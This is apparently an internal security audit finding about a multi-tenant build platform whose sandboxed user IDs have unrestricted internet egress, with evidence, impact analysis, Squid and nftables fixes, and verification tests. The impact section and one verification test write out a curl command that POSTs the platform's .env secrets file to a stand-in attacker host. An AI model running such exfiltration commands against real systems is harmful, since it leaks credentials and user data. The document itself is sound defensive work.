# 04 — No egress jail: sandboxed UIDs have full internet

**Severity:** HIGH

tl;dr: PRD §4.4 mandates that sandboxed project UIDs (10001-65000) can only reach the loopback registry proxy at `127.0.0.1:3128`; on dodev no nft skuid drop rules exist, Squid is not installed, and a `setpriv --reuid=10001` curl reaches `github.com` and `registry.npmjs.org` with HTTP 200.

## Evidence

PRD invariant, `sandboxagnosticPRD/01-architecture.md` §4.4:

> The project process MUST NOT be able to make non-loopback TCP/UDP connections except via the configured registry proxy (`http://127.0.0.1:3128`).

nft ruleset on dodev — only stock UFW chains, no `skuid` filter:

```bash
$ nft list ruleset | head
table inet filter {
  chain ufw-before-input { ... }
  chain ufw-before-output { ... }
  chain ufw-user-input { ... }
  chain ufw-user-output { ... }
  ...
}
# (no `meta skuid 10001-65000 ... drop` rule anywhere)
```

Squid not running, port 3128 unbound:

```bash
$ systemctl is-active squid
inactive
$ ss -tlnp | grep 3128
# (no output)
$ which squid
# (empty — package not installed)
```

setpriv egress test as a sandboxed UID — full internet reachable:

```bash
$ sudo setpriv --reuid=10001 --regid=10001 --clear-groups -- \
    timeout 3 curl -s -o /dev/null -w "%{http_code}\n" https://github.com
200
$ sudo setpriv --reuid=10001 --regid=10001 --clear-groups -- \
    timeout 3 curl -s -o /dev/null -w "%{http_code}\n" https://registry.npmjs.org
200
```

`setup-server.sh` references the nft + Squid rollout but the rules were never applied to this host (rolled back, alternate code path, or run before the egress block was added).

## Impact

- **Direct compromise chain with Finding 01.** `/root/doable/.env` is mode 644 (world-readable). Any sandboxed Vite child or build process under UID 10001-65000 can `cat /root/doable/.env` and `curl -X POST https://attacker.dev/exfil --data-binary @/root/doable/.env`. Single AI-generated app → full platform secret leak (DB password, JWT secret, OAuth client secrets, Copilot API keys). See `01-env-secrets.md`.
- **Arbitrary external API calls from AI-generated apps.** Code the AI emits (or a malicious prompt-injected dependency) can POST user PII, project source, chat transcripts to any endpoint. No allow-list, no audit log.
- **Internal LAN reconnaissance.** dodev sits on a DigitalOcean private network. Sandboxed UIDs can scan `10.x/8` and `172.16/12` for neighbor droplets, internal Postgres, metadata service `169.254.169.254`. Confirmed no private IPs are bound for Doable services on dodev today, but DigitalOcean metadata IMDS is reachable from any host on the droplet — flag.
- **Token theft amplification.** Even with short JWT TTLs, full real-time egress means a stolen token can be relayed to attacker infra and replayed before expiry.
- **Compliance.** Prosumer/enterprise customers expect controlled data egress. Without a jail, Doable cannot honestly claim "your AI-generated app can't phone home" — a baseline expectation for any multi-tenant build platform.

## Fix

### Step 1: Install Squid as registry-only allowlist proxy

```bash
apt-get update
apt-get install -y squid
```

Write `/etc/squid/squid.conf` (minimal allowlist; replaces stock config):

```
http_port 127.0.0.1:3128

acl allowed_dst dstdomain registry.npmjs.org
acl allowed_dst dstdomain registry.yarnpkg.com
acl allowed_dst dstdomain pypi.org
acl allowed_dst dstdomain files.pythonhosted.org
acl allowed_dst dstdomain github.com
acl allowed_dst dstdomain codeload.github.com
acl allowed_dst dstdomain raw.githubusercontent.com
acl allowed_dst dstdomain api.github.com
acl allowed_dst dstdomain objects.githubusercontent.com
acl allowed_dst dstdomain cdn.jsdelivr.net
acl allowed_dst dstdomain unpkg.com

acl SSL_ports port 443
acl Safe_ports port 80
acl Safe_ports port 443
acl CONNECT method CONNECT

http_access deny !Safe_ports
http_access deny CONNECT !SSL_ports
http_access allow allowed_dst
http_access deny all

access_log /var/log/squid/access.log squid
cache deny all
forwarded_for delete
via off
```

Enable + start:

```bash
systemctl enable --now squid
```

### Step 2: nft skuid drop rule

Drop `/etc/nftables.d/doable_egress.conf`:

```
table inet doable_egress {
  chain output {
    type filter hook output priority filter; policy accept;

    # loopback always allowed
    meta skuid 10001-65000 ip  daddr 127.0.0.0/8 accept
    meta skuid 10001-65000 ip6 daddr ::1/128     accept

    # Squid registry proxy
    meta skuid 10001-65000 ip daddr 127.0.0.1 tcp dport 3128 accept

    # local DNS (systemd-resolved stub on 127.0.0.53)
    meta skuid 10001-65000 ip daddr 127.0.0.53 udp dport 53 accept
    meta skuid 10001-65000 ip daddr 127.0.0.53 tcp dport 53 accept

    # everything else from sandboxed UIDs is dropped
    meta skuid 10001-65000 counter drop
  }
}
```

Load + persist:

```bash
nft -f /etc/nftables.d/doable_egress.conf
# include from /etc/nftables.conf so systemd nftables.service reloads on boot:
grep -q 'doable_egress.conf' /etc/nftables.conf || \
  echo 'include "/etc/nftables.d/doable_egress.conf"' >> /etc/nftables.conf
systemctl enable --now nftables
```

### Step 3: Inject HTTP_PROXY into sandboxed spawns

Edit `services/api/src/projects/vite-jail.ts:128-220` `buildSafeEnv()` to append:

```ts
HTTP_PROXY:  'http://127.0.0.1:3128',
HTTPS_PROXY: 'http://127.0.0.1:3128',
NO_PROXY:    '127.0.0.1,localhost,::1',
npm_config_proxy:       'http://127.0.0.1:3128',
npm_config_https_proxy: 'http://127.0.0.1:3128',
```

Mirror the same env block into `services/api/src/deploy/builder.ts:29-110` for `npm install` / `vite build` spawns. This closes the existing PRD TODO ("Network is intentionally NOT blocked … TODO(Wave 26+): add an allow-list once dovault network policy supports egress filtering.")

### Step 4: Bake into `setup-server.sh` (idempotent)

Add to `setup-server.sh`:

```bash
# Squid
if ! command -v squid >/dev/null; then
  apt-get install -y squid
fi
install -m 0644 ./infra/squid.conf /etc/squid/squid.conf
systemctl enable --now squid

# nft skuid jail
install -d /etc/nftables.d
install -m 0644 ./infra/doable_egress.conf /etc/nftables.d/doable_egress.conf
grep -q 'doable_egress.conf' /etc/nftables.conf || \
  echo 'include "/etc/nftables.d/doable_egress.conf"' >> /etc/nftables.conf
systemctl enable --now nftables
nft -f /etc/nftables.d/doable_egress.conf

# post-install verification
sudo setpriv --reuid=10001 --regid=10001 --clear-groups -- \
  timeout 3 curl -s -o /dev/null -w "direct-egress=%{http_code}\n" https://example.com || true
sudo setpriv --reuid=10001 --regid=10001 --clear-groups -- \
  env HTTPS_PROXY=http://127.0.0.1:3128 timeout 5 \
  curl -s -o /dev/null -w "via-proxy=%{http_code}\n" https://registry.npmjs.org
```

Fail the install if direct-egress is not `000`/`7` and via-proxy is not `200`.

### Step 5: Operator UX

- Allowlist file: `/etc/squid/squid.conf` — to add a domain (e.g. internal package mirror), append a new `acl allowed_dst dstdomain <host>` line and `systemctl reload squid`.
- Review `/var/log/squid/access.log` weekly; `TCP_DENIED/403` lines are attempted policy violations from sandboxed apps. Wire into Vigil dashboard as a KPI.
- Document in `docs/ops/egress-jail.md`: how to add a domain, how to read access.log, how to verify the jail with the setpriv test.

## Verification

```bash
# 1. nft rule present
nft list ruleset | grep -E "skuid 1000[0-9]" -A2
# expect: meta skuid 10001-65000 ... counter drop

# 2. Squid running and listening
systemctl is-active squid              # expect: active
ss -tlnp | grep 3128                   # expect: 127.0.0.1:3128 squid

# 3. Direct egress MUST FAIL
sudo setpriv --reuid=10001 --regid=10001 --clear-groups -- \
  timeout 3 curl -s -o /dev/null -w "direct github: %{http_code}\n" https://github.com
# expect: direct github: 000   (or curl exit 7 / 28)

# 4. Proxied egress to allowed domain MUST SUCCEED
sudo setpriv --reuid=10001 --regid=10001 --clear-groups -- \
  env HTTPS_PROXY=http://127.0.0.1:3128 timeout 5 \
  curl -s -o /dev/null -w "via proxy npm: %{http_code}\n" https://registry.npmjs.org
# expect: via proxy npm: 200

# 5. Disallowed domain MUST be denied by Squid
sudo setpriv --reuid=10001 --regid=10001 --clear-groups -- \
  env HTTPS_PROXY=http://127.0.0.1:3128 timeout 5 \
  curl -s -o /dev/null -w "%{http_code}\n" https://attacker.dev
# expect: 403   (Squid TCP_DENIED in access.log)

# 6. .env exfiltration attempt MUST FAIL end-to-end
sudo setpriv --reuid=10001 --regid=10001 --clear-groups -- \
  env HTTPS_PROXY=http://127.0.0.1:3128 timeout 5 \
  curl -s -o /dev/null -w "%{http_code}\n" \
  -X POST --data-binary @/root/doable/.env https://attacker.dev/exfil
# expect: 403   (and pair this with Finding 01 to make .env unreadable in the first place)
```

## References

- `sandboxagnosticPRD/01-architecture.md` §4.4 — invariant
- `setup-server.sh` — rollout home for Squid + nft
- `services/api/src/projects/vite-jail.ts:128-220` — `buildSafeEnv()` HTTP_PROXY injection
- `services/api/src/deploy/builder.ts:29-110` — build-time spawn env (closes PRD Wave 26+ TODO)
- `services/api/src/runtime/dev-uid-allocator.ts:46-64` — UID range 10001-65000
- `servertodo/01-env-secrets.md` — the secrets exfil chain pivots on
- `servertodo/05-dovault-spawn-wiring.md` — systemd-stack that should embed this jail
